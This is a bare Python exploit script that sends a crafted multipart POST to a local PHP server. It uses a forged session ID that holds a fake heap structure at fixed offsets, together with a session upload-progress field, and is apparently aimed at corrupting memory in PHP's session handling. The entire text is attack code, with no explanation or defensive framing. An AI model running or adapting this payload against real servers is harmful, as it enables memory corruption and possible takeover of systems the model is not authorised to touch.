#!/usr/bin/env python3
import socket, struct
HOST='127.0.0.1'; PORT=8088; BND=b'B'*10
L=280
sid=bytearray(b'S'*L)
sid[0:8]=b'sidvalid'
sid[8]=0
# fake gc at offset 0x110 (272)
struct.pack_into('<Q',sid,0x110,0x0000000700000001)
# marker nearby (offset 0x100)
struct.pack_into('<Q',sid,0x100,0x1122334455667788)
parts=[]
parts.append(('PHPSESSID',bytes(sid),None))
parts.append(('PHP_SESSION_UPLOAD_PROGRESS',b'pwn',None))
parts.append(('f',b'hello-file-data'*4,('a.txt','text/plain')))
o=bytearray()
for name,data,fn in parts:
    o+=b'--'+BND+b'\r\nContent-Disposition: form-data; name="'+name.encode()+b'"'
    if fn: o+=b'; filename="'+fn[0].encode()+b'"\r\nContent-Type: '+fn[1].encode()+b'\r\n\r\n'
    else: o+=b'\r\n\r\n'
    o+=data+b'\r\n'
o+=b'--'+BND+b'--\r\n'; body=bytes(o)
h=(f'POST /index.php HTTP/1.1\r\nHost: {HOST}:{PORT}\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(body)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection((HOST,PORT),timeout=20); s.settimeout(20)
try: s.sendall(h+body)
except OSError: pass
try:
    while s.recv(65536): pass
except OSError: pass
s.close()
